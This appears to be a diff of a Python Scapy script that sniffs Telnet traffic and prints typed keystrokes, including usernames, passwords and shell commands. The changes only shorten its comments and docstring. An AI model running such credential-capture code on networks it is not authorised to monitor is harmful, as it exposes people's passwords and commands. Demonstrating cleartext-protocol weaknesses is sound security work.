@@ -13,9 +13,8 @@
 
 """Telnet keystroke sniffer using Scapy.
 
-Sniffs TCP port 23 traffic and prints each keystroke exactly once as the
-user types it (username, password, and any shell commands), ignoring the
-packets in which the remote host echoes the keystroke back.
+Sniffs TCP port 23 and prints each keystroke once as it's typed (username,
+password, commands), skipping the server's echo so nothing prints twice.
 
 Usage: sudo python3 telnet_sniffer.py [interface]
 """
@@ -27,12 +26,11 @@ from scapy.packet import Raw
 from scapy.sendrecv import sniff
 
 TELNET_PORT = 23
-TELNET_IAC = 0xFF  # marks option-negotiation data (terminal type, window size, ...)
-PRINTABLE = set(range(0x20, 0x7F))  # visible ASCII only; CR/LF handled separately below
+TELNET_IAC = 0xFF  # start of telnet option negotiation
+PRINTABLE = set(range(0x20, 0x7F))  # visible ASCII; CR/LF handled below
 
-# Telnet's "Enter" is CR followed by a padding NUL or LF (CR NUL / CR LF).
-# Tracks whether the previous byte was a CR, so that pairing byte can be
-# swallowed instead of producing a second blank line.
+# Enter comes across as CR then a NUL or LF. Track whether the last byte was
+# CR so we can swallow the pair byte instead of printing a second newline.
 _after_cr = False
 
 
@@ -42,33 +40,27 @@ def handle_packet(pkt):
     if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
         return
 
-    # Only look at packets heading TO port 23 (client -> server). These are
-    # the characters the user actually typed. Packets FROM port 23
-    # (server -> client, sport == 23) are the server echoing the keystroke
-    # back to the terminal, and are skipped so each character is printed once.
+    # Only client -> server (dport 23) is what the user typed. The reverse
+    # direction is the server echoing it back, so skip it to avoid doubles.
     if pkt[TCP].dport != TELNET_PORT:
         return
 
     data = pkt[Raw].load
 
-    # Telnet option negotiation (IAC DO/WILL/SB ... SE) is not a keystroke,
-    # even though the embedded option text (e.g. a terminal type or speed
-    # string) is itself printable. Drop the whole packet if it contains IAC.
+    # Skip option-negotiation packets. The option text can be printble too,
+    # so drop the whole packet if there's an IAC byte anywhere in it.
     if TELNET_IAC in data:
         return
 
     for byte in data:
         if _after_cr and byte in (0x00, 0x0A):
-            # Second half of a CR-NUL / CR-LF "Enter" pair; already handled.
-            _after_cr = False
+            _after_cr = False  # pair byte after CR, already printed the newline
             continue
         _after_cr = False
 
         if byte == 0x0D:
-            # A bare '\r' would just return the cursor to the start of the
-            # current line, so the next word (e.g. the password) overwrites
-            # the previous one (e.g. the username) on screen. Print a real
-            # newline instead so each line the user typed stays visible.
+            # print a real newline for CR, otherwise the next line just
+            # overwrites this one on screen (password over username)
             sys.stdout.write("\n")
             _after_cr = True
         elif byte == 0x0A:
